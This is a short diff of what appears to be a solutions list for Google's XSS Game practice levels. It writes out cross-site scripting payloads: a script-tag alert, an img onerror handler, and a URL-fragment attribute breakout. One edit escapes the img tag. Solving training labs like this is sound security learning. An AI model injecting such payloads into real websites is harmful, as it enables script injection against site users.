@@ -30,7 +30,7 @@ Origin source: https://xss-game.appspot.com
  # 1 Just insert following code and you're done:
   <script>alert('xss')</script>
  # 2 Use an img tag along with the onerror attribute:
-  <img src="notexist.url" onerror="javascript:alert('xss')"/>
+  <\img src="notexist.url" onerror="javascript:alert('xss')"/>
  # 3 Use the onerror attribute to insert JS:
   https://xss-game.appspot.com/level3/frame#3' onerror="alert('xss')";
 # 4 Insert the request:
